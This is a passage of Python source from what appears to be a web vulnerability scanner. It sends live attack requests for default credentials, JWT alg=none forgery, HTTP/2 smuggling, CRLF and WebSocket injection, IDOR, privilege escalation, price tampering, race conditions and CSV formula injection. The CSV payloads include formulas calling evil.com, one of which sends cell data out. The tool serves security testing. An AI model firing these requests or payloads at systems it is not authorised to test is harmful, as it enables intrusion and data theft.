        ("root", "root"), ("root", "toor"), ("admin", ""),
        ("administrator", "administrator"), ("test", "test"),
        ("user", "user"), ("guest", "guest"),
    ]

    admin_paths = [
        "/admin", "/administrator", "/admin/login", "/wp-admin",
        "/manage", "/manager", "/console", "/dashboard",
        "/admin/dashboard", "/panel", "/cpanel", "/phpmyadmin",
    ]

    try:
        # Test default credentials on login
        login_paths = ["/login", "/signin", "/api/auth/login", "/admin/login", "/api/login"]
        for path in login_paths:
            login_url = urljoin(base, path)
            for username, password in default_creds:
                resp = await _safe_post(client, login_url, data={
                    "username": username, "password": password,
                })
                if not resp:
                    resp = await _safe_post(client, login_url, json={
                        "username": username, "password": password,
                    })
                if resp and resp.status_code in (200, 302):
                    # Check for success indicators
                    success_indicators = ["dashboard", "welcome", "logout", "token", "session", "jwt"]
                    fail_indicators = ["invalid", "incorrect", "failed", "wrong", "error", "denied"]
                    is_success = any(ind in resp.text.lower() for ind in success_indicators)
                    is_fail = any(ind in resp.text.lower() for ind in fail_indicators)
                    if is_success and not is_fail:
                        findings.append(_finding(
                            template_id="pro-default-credentials",
                            name="Default Credentials Accepted",
                            severity="critical",
                            url=login_url,
                            description=f"Login accepted default credentials: {username}:{password}",
                            confidence="firm",
                            remediation="Change default credentials. Force password change on first login.",
                        ))
                        break
            if findings:
                break

        # Admin panel without auth
        for path in admin_paths:
            admin_url = urljoin(base, path)
            resp = await _safe_get(client, admin_url)
            if resp and resp.status_code == 200:
                admin_indicators = ["admin", "dashboard", "manage", "settings", "users", "configuration"]
                auth_indicators = ["login", "sign in", "password", "authenticate"]
                has_admin = sum(1 for ind in admin_indicators if ind in resp.text.lower()) >= 2
                has_auth = any(ind in resp.text.lower() for ind in auth_indicators)
                if has_admin and not has_auth and len(resp.text) > 500:
                    findings.append(_finding(
                        template_id="pro-admin-no-auth",
                        name="Admin Panel Accessible Without Authentication",
                        severity="high",
                        url=admin_url,
                        description=f"Admin panel at {path} accessible without authentication.",
                        confidence="tentative",
                        remediation="Require authentication for all admin endpoints.",
                    ))
                    break

        # JWT none algorithm
        jwt_none = base64.b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip("=")
        jwt_payload = base64.b64encode(b'{"sub":"admin","role":"admin","iat":1}').decode().rstrip("=")
        jwt_token = f"{jwt_none}.{jwt_payload}."

        # JWT HS256 with empty secret
        jwt_hs256 = base64.b64encode(b'{"alg":"HS256","typ":"JWT"}').decode().rstrip("=")

        for auth_header in [f"Bearer {jwt_token}", jwt_token]:
            resp = await _safe_get(client, url, headers={"Authorization": auth_header})
            if resp and resp.status_code == 200:
                unauth_resp = await _safe_get(client, url)
                if unauth_resp and len(resp.text) > len(unauth_resp.text) + 50:
                    findings.append(_finding(
                        template_id="pro-jwt-none-alg",
                        name="JWT None Algorithm Bypass",
                        severity="critical",
                        url=url,
                        description="Server accepted JWT with alg=none. Authentication completely bypassed.",
                        confidence="firm",
                        remediation="Reject JWTs with alg=none. Enforce algorithm whitelist.",
                    ))
                    break
    except Exception as e:
        log.debug("auth_bypass_expanded error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 23. h2_smuggling
# ═════════════════════════════════════════════════════════════════════════════

async def h2_smuggling(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """H2.CL and H2.TE HTTP/2 request smuggling attempts."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    target = f"{parsed.scheme}://{parsed.netloc}/"

    try:
        # H2.CL: Send Content-Length that doesn't match body in HTTP/2
        smuggle_body = "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {}\r\n\r\n".format(parsed.netloc)
        resp = await _safe_post(
            client, target,
            content=smuggle_body.encode(),
            headers={
                "Content-Length": str(len(smuggle_body) + 50),
                "Content-Type": "application/x-www-form-urlencoded",
            },
        )
        if resp and resp.status_code not in (400, 403, 404, 405, 501):
            # Check for desync indicators
            if "admin" in resp.text.lower() or resp.status_code == 200:
                findings.append(_finding(
                    template_id="pro-h2-smuggling-cl",
                    name="HTTP/2 Request Smuggling (H2.CL)",
                    severity="high",
                    url=target,
                    description=(
                        "HTTP/2 endpoint accepted mismatched Content-Length. "
                        "Manual verification needed for H2.CL desync exploitation."
                    ),
                    confidence="tentative",
                    remediation="Normalize Content-Length in HTTP/2 proxy. Use HTTP/2 end-to-end.",
                ))

        # H2.TE: Transfer-Encoding in HTTP/2 (should be rejected)
        te_body = "1\r\nZ\r\n0\r\n\r\n"
        resp = await _safe_post(
            client, target,
            content=te_body.encode(),
            headers={
                "Transfer-Encoding": "chunked",
                "Content-Type": "application/x-www-form-urlencoded",
            },
        )
        if resp and resp.status_code not in (400, 403, 404, 405, 501):
            findings.append(_finding(
                template_id="pro-h2-smuggling-te",
                name="HTTP/2 Transfer-Encoding Accepted",
                severity="medium",
                url=target,
                description=(
                    "HTTP/2 endpoint accepted Transfer-Encoding header, which should be "
                    "rejected per RFC 7540. May indicate H2.TE desync vulnerability."
                ),
                confidence="tentative",
                remediation="Strip Transfer-Encoding from HTTP/2 requests at the proxy layer.",
            ))

        # CRLF injection in HTTP/2 pseudo-headers (via header value)
        resp = await _safe_get(
            client, target,
            headers={"X-Test": "value\r\nX-Injected: true"},
        )
        if resp and "x-injected" in str(resp.headers).lower():
            findings.append(_finding(
                template_id="pro-h2-header-injection",
                name="HTTP/2 Header Injection via CRLF",
                severity="high",
                url=target,
                description="CRLF in header value resulted in injected header in HTTP/2.",
                confidence="confirmed",
                remediation="Strip CRLF from header values.",
            ))
    except Exception as e:
        log.debug("h2_smuggling error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 24. websocket_injection
# ═════════════════════════════════════════════════════════════════════════════

async def websocket_injection(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Test for injection in WebSocket upgrade request and common WS message patterns."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    ws_url = url.replace("https://", "wss://").replace("http://", "ws://")

    ws_payloads = [
        '<script>alert(1)</script>',
        '{"__proto__":{"polluted":"true"}}',
        "' OR 1=1--",
        '{{7*7}}',
        '${7*7}',
        '../../../etc/passwd',
    ]

    try:
        # Test WebSocket upgrade with injection in headers
        upgrade_headers = {
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": base64.b64encode(b"pxe-test-12345678").decode(),
            "Sec-WebSocket-Version": "13",
            "Origin": f"http://evil.{COLLAB_DOMAIN}",
        }
        resp = await _safe_get(client, url, headers=upgrade_headers)
        if resp:
            if resp.status_code == 101:
                findings.append(_finding(
                    template_id="pro-ws-upgrade-accepted",
                    name="WebSocket Upgrade Accepted",
                    severity="info",
                    url=url,
                    description="WebSocket upgrade successful. Further testing recommended with WS client.",
                    confidence="confirmed",
                ))
            # Check if evil origin was accepted
            if resp.status_code == 101 or (resp.status_code == 200 and "upgrade" in resp.text.lower()):
                findings.append(_finding(
                    template_id="pro-ws-cross-origin",
                    name="WebSocket Cross-Origin Accepted",
                    severity="medium",
                    url=url,
                    description=f"WebSocket accepted connection from foreign origin: http://evil.{COLLAB_DOMAIN}",
                    confidence="tentative",
                    remediation="Validate Origin header in WebSocket handshake.",
                ))

        # Test CRLF in WebSocket upgrade path
        crlf_url = url + "%0d%0aInjected-Header: true"
        resp = await _safe_get(client, crlf_url, headers={
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": base64.b64encode(b"pxe-test-12345678").decode(),
            "Sec-WebSocket-Version": "13",
        })
        if resp and "injected-header" in str(resp.headers).lower():
            findings.append(_finding(
                template_id="pro-ws-crlf-injection",
                name="WebSocket CRLF Injection",
                severity="high",
                url=url,
                description="CRLF injection in WebSocket upgrade request path.",
                confidence="confirmed",
                remediation="Sanitize WebSocket upgrade request paths.",
            ))

        # Test common WS endpoints
        ws_paths = ["/ws", "/websocket", "/socket.io/", "/graphql-ws", "/cable", "/hub"]
        base = f"{parsed.scheme}://{parsed.netloc}"
        for path in ws_paths:
            ws_test_url = urljoin(base, path)
            resp = await _safe_get(client, ws_test_url, headers=upgrade_headers)
            if resp and resp.status_code in (101, 200, 426):
                findings.append(_finding(
                    template_id="pro-ws-endpoint-found",
                    name=f"WebSocket Endpoint Found ({path})",
                    severity="info",
                    url=ws_test_url,
                    description=f"WebSocket endpoint at {path} (status: {resp.status_code}).",
                    confidence="confirmed",
                ))
                break
    except Exception as e:
        log.debug("websocket_injection error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 25. http_response_splitting
# ═════════════════════════════════════════════════════════════════════════════

async def http_response_splitting(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Advanced CRLF / HTTP response splitting in headers and cookies."""
    findings: list[ScanFinding] = []

    crlf_payloads = [
        ("%0d%0aX-Injected: true", "URL-encoded CRLF"),
        ("%0d%0a%0d%0a<html>injected</html>", "CRLF body injection"),
        ("\r\nX-Injected: true", "raw CRLF"),
        ("%E5%98%8A%E5%98%8DX-Injected: true", "Unicode CRLF (U+560A U+560D)"),
        ("%0AX-Injected: true", "LF-only injection"),
        ("%0DX-Injected: true", "CR-only injection"),
        ("%00%0d%0aX-Injected: true", "null-byte + CRLF"),
        ("%%0d%%0aX-Injected: true", "double-percent CRLF"),
    ]

    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        # Inject in URL parameters
        for payload, desc in crlf_payloads:
            if params:
                for key in params:
                    new_params = {k: v[0] for k, v in params.items()}
                    new_params[key] = params[key][0] + payload
                    test_url = urlunparse(parsed._replace(query=urlencode(new_params, safe="%")))
                    resp = await _safe_get(client, test_url)
                    if resp and "x-injected" in str(resp.headers).lower():
                        findings.append(_finding(
                            template_id="pro-http-response-splitting",
                            name=f"HTTP Response Splitting ({desc})",
                            severity="high",
                            url=url,
                            description=(
                                f"CRLF injection in parameter '{key}' results in header injection. "
                                f"Technique: {desc}"
                            ),
                            confidence="confirmed",
                            matched_at=test_url,
                            remediation="Strip CR/LF from all user input used in HTTP headers.",
                        ))
                        return findings
            else:
                test_url = url + payload
                resp = await _safe_get(client, test_url)
                if resp and "x-injected" in str(resp.headers).lower():
                    findings.append(_finding(
                        template_id="pro-http-response-splitting-path",
                        name=f"HTTP Response Splitting in Path ({desc})",
                        severity="high",
                        url=url,
                        description=f"CRLF injection in URL path: {desc}",
                        confidence="confirmed",
                        matched_at=test_url,
                        remediation="Strip CR/LF from all user input.",
                    ))
                    return findings

        # Inject in headers that may be reflected
        for payload, desc in crlf_payloads[:3]:
            resp = await _safe_get(client, url, headers={
                "X-Custom": f"value{payload}",
                "Referer": f"http://test.com/{payload}",
            })
            if resp and "x-injected" in str(resp.headers).lower():
                findings.append(_finding(
                    template_id="pro-header-crlf",
                    name=f"CRLF Injection via Request Header ({desc})",
                    severity="high",
                    url=url,
                    description=f"CRLF in request header reflected in response headers. {desc}",
                    confidence="confirmed",
                    remediation="Sanitize all reflected header values.",
                ))
                return findings
    except Exception as e:
        log.debug("http_response_splitting error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 26. clickjacking_check
# ═════════════════════════════════════════════════════════════════════════════

async def clickjacking_check(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Verify X-Frame-Options and CSP frame-ancestors for clickjacking protection."""
    findings: list[ScanFinding] = []

    try:
        resp = await _safe_get(client, url)
        if not resp:
            return findings

        xfo = resp.headers.get("x-frame-options", "").lower()
        csp = resp.headers.get("content-security-policy", "").lower()
        content_type = resp.headers.get("content-type", "").lower()

        # Only check HTML responses
        if "html" not in content_type:
            return findings

        has_xfo = bool(xfo)
        has_frame_ancestors = "frame-ancestors" in csp

        if not has_xfo and not has_frame_ancestors:
            findings.append(_finding(
                template_id="pro-clickjacking",
                name="Clickjacking — No Frame Protection",
                severity="medium",
                url=url,
                description=(
                    "Response has neither X-Frame-Options nor CSP frame-ancestors. "
                    "Page can be embedded in an iframe for clickjacking attacks."
                ),
                confidence="confirmed",
                remediation="Set X-Frame-Options: DENY (or SAMEORIGIN) and CSP frame-ancestors 'self'.",
            ))
        elif has_xfo:
            if xfo not in ("deny", "sameorigin") and not xfo.startswith("allow-from"):
                findings.append(_finding(
                    template_id="pro-clickjacking-invalid-xfo",
                    name="Invalid X-Frame-Options Value",
                    severity="low",
                    url=url,
                    description=f"X-Frame-Options has invalid value: '{xfo}'. Browsers may ignore it.",
                    confidence="confirmed",
                    remediation="Use X-Frame-Options: DENY or SAMEORIGIN.",
                ))
            if xfo.startswith("allow-from"):
                findings.append(_finding(
                    template_id="pro-clickjacking-allow-from",
                    name="X-Frame-Options ALLOW-FROM (Deprecated)",
                    severity="low",
                    url=url,
                    description="X-Frame-Options ALLOW-FROM is not supported by modern browsers. Use CSP frame-ancestors.",
                    confidence="confirmed",
                    remediation="Replace ALLOW-FROM with CSP frame-ancestors directive.",
                ))

        if has_frame_ancestors:
            fa_match = re.search(r"frame-ancestors\s+([^;]+)", csp)
            if fa_match:
                fa_value = fa_match.group(1).strip()
                if "*" in fa_value:
                    findings.append(_finding(
                        template_id="pro-clickjacking-csp-wildcard",
                        name="CSP frame-ancestors Contains Wildcard",
                        severity="medium",
                        url=url,
                        description=f"frame-ancestors allows wildcard: {fa_value}",
                        confidence="confirmed",
                        remediation="Restrict frame-ancestors to 'self' or specific trusted origins.",
                    ))
    except Exception as e:
        log.debug("clickjacking_check error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 27. tls_configuration
# ═════════════════════════════════════════════════════════════════════════════

async def tls_configuration(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Check TLS/security headers on HTTPS responses."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)

    try:
        resp = await _safe_get(client, url)
        if not resp:
            return findings

        headers = {k.lower(): v for k, v in resp.headers.items()}

        # HSTS check
        hsts = headers.get("strict-transport-security", "")
        if not hsts and parsed.scheme == "https":
            findings.append(_finding(
                template_id="pro-missing-hsts",
                name="Missing Strict-Transport-Security (HSTS)",
                severity="medium",
                url=url,
                description="HTTPS response missing HSTS header. Users may be downgraded to HTTP.",
                confidence="confirmed",
                remediation="Add Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
            ))
        elif hsts:
            max_age_match = re.search(r"max-age=(\d+)", hsts)
            if max_age_match and int(max_age_match.group(1)) < 15768000:
                findings.append(_finding(
                    template_id="pro-weak-hsts",
                    name="Weak HSTS max-age",
                    severity="low",
                    url=url,
                    description=f"HSTS max-age is {max_age_match.group(1)} (< 6 months recommended minimum).",
                    confidence="confirmed",
                    remediation="Set HSTS max-age to at least 31536000 (1 year).",
                ))

        # Security headers check
        security_headers = {
            "x-content-type-options": ("nosniff", "Missing X-Content-Type-Options"),
            "x-xss-protection": (None, "Missing X-XSS-Protection"),
            "referrer-policy": (None, "Missing Referrer-Policy"),
            "permissions-policy": (None, "Missing Permissions-Policy"),
        }

        for header, (expected_val, desc) in security_headers.items():
            val = headers.get(header, "")
            if not val:
                findings.append(_finding(
                    template_id=f"pro-missing-{header}",
                    name=desc,
                    severity="info",
                    url=url,
                    description=f"Response missing security header: {header}",
                    confidence="confirmed",
                    remediation=f"Add {header} header to all responses.",
                ))

        # Check for server info disclosure
        server = headers.get("server", "")
        x_powered = headers.get("x-powered-by", "")
        if server and re.search(r"[\d.]", server):
            findings.append(_finding(
                template_id="pro-server-version-disclosure",
                name="Server Version Disclosure",
                severity="info",
                url=url,
                description=f"Server header reveals version: {server}",
                confidence="confirmed",
                extracted=[server],
                remediation="Remove or genericize the Server header.",
            ))
        if x_powered:
            findings.append(_finding(
                template_id="pro-x-powered-by",
                name="X-Powered-By Header Disclosure",
                severity="info",
                url=url,
                description=f"X-Powered-By header reveals: {x_powered}",
                confidence="confirmed",
                extracted=[x_powered],
                remediation="Remove the X-Powered-By header.",
            ))
    except Exception as e:
        log.debug("tls_configuration error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 28. price_manipulation
# ═════════════════════════════════════════════════════════════════════════════

async def price_manipulation(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Modify price/quantity/discount params to detect business logic manipulation."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    price_keys = ["price", "amount", "total", "cost", "value", "qty", "quantity", "discount", "subtotal"]

    try:
        # Check GET params
        for key in params:
            if key.lower() in price_keys or any(pk in key.lower() for pk in price_keys):
                original_val = params[key][0]
                manipulations = [
                    ("0", "zero value"),
                    ("-1", "negative value"),
                    ("0.01", "minimum price"),
                    ("0.001", "sub-cent price"),
                    ("99999999", "extremely high value"),
                    ("-" + original_val, "negated original"),
                ]
                for manip_val, desc in manipulations:
                    new_params = {k: v[0] for k, v in params.items()}
                    new_params[key] = manip_val
                    test_url = urlunparse(parsed._replace(query=urlencode(new_params)))
                    resp = await _safe_get(client, test_url)
                    if resp and resp.status_code == 200:
                        success_indicators = ["success", "confirmed", "order", "thank", "receipt", "complete"]
                        error_indicators = ["invalid", "error", "must be", "cannot", "minimum"]
                        has_success = any(ind in resp.text.lower() for ind in success_indicators)
                        has_error = any(ind in resp.text.lower() for ind in error_indicators)
                        if has_success and not has_error:
                            findings.append(_finding(
                                template_id="pro-price-manipulation",
                                name=f"Price Manipulation ({desc})",
                                severity="high",
                                url=url,
                                description=(
                                    f"Parameter '{key}' accepted manipulated value '{manip_val}' ({desc}). "
                                    "Server did not reject the invalid price/quantity."
                                ),
                                confidence="tentative",
                                matched_at=test_url,
                                remediation="Validate all pricing server-side. Never trust client-supplied prices.",
                            ))
                            break

        # POST body price manipulation
        price_bodies = [
            {"price": "0.01", "quantity": "1"},
            {"amount": "-1", "currency": "USD"},
            {"total": "0", "items": [{"id": "1", "qty": "1"}]},
            {"discount": "100", "coupon": "INVALID"},
        ]
        for body in price_bodies:
            resp = await _safe_post(client, url, json=body)
            if resp and resp.status_code in (200, 201):
                success_indicators = ["success", "order", "confirmed"]
                if any(ind in resp.text.lower() for ind in success_indicators):
                    findings.append(_finding(
                        template_id="pro-price-manipulation-post",
                        name="Price Manipulation via POST",
                        severity="high",
                        url=url,
                        description=f"Server accepted manipulated price data: {json.dumps(body)[:100]}",
                        confidence="tentative",
                        remediation="Validate pricing server-side. Use server-side price lookup.",
                    ))
                    break
    except Exception as e:
        log.debug("price_manipulation error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 29. race_condition_advanced
# ═════════════════════════════════════════════════════════════════════════════

async def race_condition_advanced(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Simultaneous requests for sensitive operations to detect TOCTOU race conditions."""
    findings: list[ScanFinding] = []

    try:
        # Phase 1: send single request to establish baseline
        baseline = await _safe_get(client, url)
        if not baseline:
            baseline = await _safe_post(client, url, data={"action": "claim"})
        if not baseline:
            return findings

        # Phase 2: send N simultaneous requests
        num_concurrent = 10

        async def race_request(i: int) -> httpx.Response | None:
            return await _safe_get(client, url)

        tasks = [race_request(i) for i in range(num_concurrent)]
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        valid_responses = [r for r in responses if isinstance(r, httpx.Response)]

        if len(valid_responses) < 2:
            return findings

        # Analyze for race condition indicators
        statuses = [r.status_code for r in valid_responses]
        lengths = [len(r.text) for r in valid_responses]
        unique_statuses = set(statuses)
        unique_lengths = set(lengths)

        # Different outcomes from identical requests suggest race condition
        if len(unique_statuses) > 1 and 200 in unique_statuses:
            findings.append(_finding(
                template_id="pro-race-condition",
                name="Potential Race Condition (Status Variance)",
                severity="medium",
                url=url,
                description=(
                    f"Concurrent requests produced {len(unique_statuses)} different status codes: "
                    f"{unique_statuses}. This may indicate a race condition / TOCTOU bug."
                ),
                confidence="tentative",
                remediation="Use database-level locking or atomic operations for sensitive state changes.",
            ))

        if len(unique_lengths) > 3 and max(lengths) - min(lengths) > 100:
            findings.append(_finding(
                template_id="pro-race-condition-length",
                name="Potential Race Condition (Response Variance)",
                severity="medium",
                url=url,
                description=(
                    f"Concurrent requests produced highly variable response lengths "
                    f"(min={min(lengths)}, max={max(lengths)}, unique={len(unique_lengths)}). "
                    "May indicate race-sensitive state."
                ),
                confidence="tentative",
                remediation="Implement proper locking for state-changing operations.",
            ))

        # Phase 3: test POST race conditions (coupon, vote, transfer)
        race_bodies = [
            {"action": "claim", "code": "BONUS"},
            {"action": "vote", "id": "1"},
            {"action": "transfer", "amount": "1"},
        ]
        for body in race_bodies:
            async def race_post(i: int) -> httpx.Response | None:
                return await _safe_post(client, url, json=body)

            tasks = [race_post(i) for i in range(num_concurrent)]
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            valid = [r for r in responses if isinstance(r, httpx.Response)]
            success_count = sum(1 for r in valid if r.status_code in (200, 201))
            if success_count > 1:
                # Multiple successes for single-use operations
                findings.append(_finding(
                    template_id="pro-race-condition-post",
                    name="Race Condition in POST Operation",
                    severity="high",
                    url=url,
                    description=(
                        f"{success_count}/{len(valid)} concurrent POST requests succeeded "
                        f"(body: {json.dumps(body)[:80]}). "
                        "Single-use operations should only succeed once."
                    ),
                    confidence="tentative",
                    remediation="Use idempotency keys and database-level constraints.",
                ))
                break
    except Exception as e:
        log.debug("race_condition_advanced error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 30. idor_comprehensive
# ═════════════════════════════════════════════════════════════════════════════

async def idor_comprehensive(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """IDOR testing: ID +/-1, +/-2, +/-100, UUID variants in all params and paths."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    id_keys = ["id", "user_id", "userId", "uid", "account_id", "accountId",
               "order_id", "orderId", "doc_id", "docId", "file_id", "fileId",
               "item_id", "itemId", "profile_id", "profileId"]

    try:
        baseline = await _safe_get(client, url)
        if not baseline:
            return findings

        # Test query parameters
        for key in params:
            val = params[key][0]
            is_id_param = key.lower() in [k.lower() for k in id_keys] or "id" in key.lower()
            if not is_id_param:
                continue

            # Try to parse as integer
            try:
                int_val = int(val)
                offsets = [1, -1, 2, -2, 100, -100, 0]
                for offset in offsets:
                    new_val = str(int_val + offset)
                    if new_val == val:
                        continue
                    new_params = {k: v[0] for k, v in params.items()}
                    new_params[key] = new_val
                    test_url = urlunparse(parsed._replace(query=urlencode(new_params)))
                    resp = await _safe_get(client, test_url)
                    if resp and resp.status_code == 200 and len(resp.text) > 50:
                        # Check if we got different data (not same object, not error)
                        if resp.text != baseline.text and abs(len(resp.text) - len(baseline.text)) < len(baseline.text):
                            error_indicators = ["not found", "forbidden", "denied", "unauthorized", "no access"]
                            if not any(ind in resp.text.lower() for ind in error_indicators):
                                findings.append(_finding(
                                    template_id="pro-idor-comprehensive",
                                    name="Potential IDOR",
                                    severity="high",
                                    url=url,
                                    description=(
                                        f"Parameter '{key}' changed from {val} to {new_val} returned "
                                        f"different data (200 OK, {len(resp.text)} bytes). "
                                        "May expose other users' data without authorization check."
                                    ),
                                    confidence="tentative",
                                    matched_at=test_url,
                                    remediation="Implement server-side authorization checks for all object access.",
                                ))
                                break
            except ValueError:
                pass

            # UUID variant test
            if re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', val, re.I):
                # Try incrementing last byte
                uuid_bytes = val.replace("-", "")
                last_byte = int(uuid_bytes[-2:], 16)
                for offset in [1, -1, 2]:
                    new_byte = (last_byte + offset) % 256
                    new_uuid = uuid_bytes[:-2] + f"{new_byte:02x}"
                    formatted = f"{new_uuid[:8]}-{new_uuid[8:12]}-{new_uuid[12:16]}-{new_uuid[16:20]}-{new_uuid[20:]}"
                    new_params = {k: v[0] for k, v in params.items()}
                    new_params[key] = formatted
                    test_url = urlunparse(parsed._replace(query=urlencode(new_params)))
                    resp = await _safe_get(client, test_url)
                    if resp and resp.status_code == 200 and len(resp.text) > 50:
                        if resp.text != baseline.text:
                            findings.append(_finding(
                                template_id="pro-idor-uuid",
                                name="Potential IDOR (UUID Manipulation)",
                                severity="high",
                                url=url,
                                description=f"UUID parameter '{key}' modified from {val} to {formatted} returned different data.",
                                confidence="tentative",
                                matched_at=test_url,
                                remediation="Use proper authorization checks, not UUID obscurity.",
                            ))
                            break

        # Test path-based IDs
        path_parts = parsed.path.strip("/").split("/")
        for i, part in enumerate(path_parts):
            try:
                int_val = int(part)
                for offset in [1, -1, 100]:
                    new_parts = path_parts.copy()
                    new_parts[i] = str(int_val + offset)
                    new_path = "/" + "/".join(new_parts)
                    test_url = urlunparse(parsed._replace(path=new_path))
                    resp = await _safe_get(client, test_url)
                    if resp and resp.status_code == 200 and resp.text != baseline.text:
                        findings.append(_finding(
                            template_id="pro-idor-path",
                            name="Potential IDOR (Path-Based)",
                            severity="high",
                            url=url,
                            description=f"Path ID changed from {part} to {int_val + offset} returned different data.",
                            confidence="tentative",
                            matched_at=test_url,
                            remediation="Implement authorization checks for path-based resource access.",
                        ))
                        break
            except ValueError:
                continue
    except Exception as e:
        log.debug("idor_comprehensive error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 31. privilege_escalation
# ═════════════════════════════════════════════════════════════════════════════

async def privilege_escalation(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Test role/admin/group parameter injection for privilege escalation."""
    findings: list[ScanFinding] = []

    priv_params = {
        "role": ["admin", "administrator", "superadmin", "root"],
        "admin": ["true", "1", "yes"],
        "is_admin": ["true", "1", "yes"],
        "isAdmin": ["true", "1"],
        "group": ["admin", "administrators", "root"],
        "level": ["10", "99", "admin"],
        "access": ["admin", "full", "all"],
        "permissions": ["admin", "all", "*"],
        "type": ["admin", "staff", "moderator"],
        "user_type": ["admin", "superuser"],
        "verified": ["true", "1"],
        "is_staff": ["true", "1"],
        "is_superuser": ["true", "1"],
    }

    try:
        baseline = await _safe_get(client, url)
        baseline_text = baseline.text if baseline else ""

        # Inject privilege params via GET
        parsed = urlparse(url)
        for param, values in priv_params.items():
            for val in values[:1]:  # test first value only
                existing = parse_qs(parsed.query, keep_blank_values=True)
                existing[param] = [val]
                test_url = urlunparse(parsed._replace(query=urlencode({k: v[0] for k, v in existing.items()})))
                resp = await _safe_get(client, test_url)
                if resp and resp.status_code == 200:
                    priv_indicators = ["admin", "manage", "settings", "dashboard", "users", "configuration", "privileges"]
                    new_content = [ind for ind in priv_indicators if ind in resp.text.lower() and ind not in baseline_text.lower()]
                    if new_content and len(resp.text) > len(baseline_text) + 50:
                        findings.append(_finding(
                            template_id="pro-privilege-escalation-get",
                            name=f"Potential Privilege Escalation ({param}={val})",
                            severity="high",
                            url=url,
                            description=(
                                f"Adding '{param}={val}' to request revealed admin content: {', '.join(new_content)}. "
                                f"Response grew by {len(resp.text) - len(baseline_text)} bytes."
                            ),
                            confidence="tentative",
                            matched_at=test_url,
                            remediation="Never use client-supplied role/admin parameters. Derive permissions from server session.",
                        ))
                        break

        # Inject via POST/PUT
        for param, values in priv_params.items():
            body = {param: values[0]}
            for method in ["PUT", "PATCH", "POST"]:
                resp = await _safe_request(client, method, url, json=body)
                if resp and resp.status_code in (200, 201):
                    if "admin" in resp.text.lower() or "role" in resp.text.lower():
                        findings.append(_finding(
                            template_id="pro-privilege-escalation-post",
                            name=f"Potential Privilege Escalation via {method}",
                            severity="high",
                            url=url,
                            description=f"Server accepted {method} with {param}={values[0]}.",
                            confidence="tentative",
                            remediation="Whitelist allowed fields in update operations.",
                        ))
                        return findings
    except Exception as e:
        log.debug("privilege_escalation error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 32. csv_injection
# ═════════════════════════════════════════════════════════════════════════════

async def csv_injection(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Formula injection in CSV-generating endpoints via dangerous prefixes."""
    findings: list[ScanFinding] = []

    csv_payloads = [
        '=CMD("calc")',
        '=HYPERLINK("http://evil.com","Click")',
        '+cmd|/C calc|',
        '-cmd|/C calc|',
        '@SUM(1+1)*cmd|/C calc|',
        '=1+1',
        "=IMPORTXML(CONCAT(\"http://evil.com/?\",A1),\"//a\")",
    ]

    try:
        # Inject into fields that might end up in CSV exports
        for payload in csv_payloads:
            field_data = {"name": payload, "email": payload, "comment": payload, "description": payload}
            resp = await _safe_post(client, url, data=field_data)
            if not resp:
                resp = await _safe_post(client, url, json=field_data)

        # Check for CSV export endpoints
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        csv_paths = [
            parsed.path + "?format=csv",
            parsed.path + "?export=csv",
            parsed.path + "/export",
            parsed.path + "/download",
            parsed.path.rstrip("/") + ".csv",
        ]

        for csv_path in csv_paths:
            test_url = urljoin(base, csv_path)
            resp = await _safe_get(client, test_url)
            if resp and resp.status_code == 200:
                ct = resp.headers.get("content-type", "")
                if "csv" in ct or "spreadsheet" in ct or "excel" in ct:
                    # Check if any formula payload survived
                    for payload in csv_payloads:
                        if payload in resp.text:
                            findings.append(_finding(
                                template_id="pro-csv-injection",
                                name="CSV Formula Injection",
                                severity="medium",
                                url=test_url,
                                description=(
                                    f"CSV export contains unsanitized formula: {payload}. "
                                    "Opening in Excel/LibreOffice could execute arbitrary commands."
                                ),
                                confidence="confirmed",
                                extracted=[payload],
                                remediation="Prefix CSV values starting with =, +, -, @, \\t, \\r with a single quote.",
                            ))
                            return findings
    except Exception as e:
        log.debug("csv_injection error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 33. smtp_injection
# ═════════════════════════════════════════════════════════════════════════════

async def smtp_injection(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """CRLF injection in email-related parameters to inject SMTP headers."""
    findings: list[ScanFinding] = []

    smtp_payloads = [
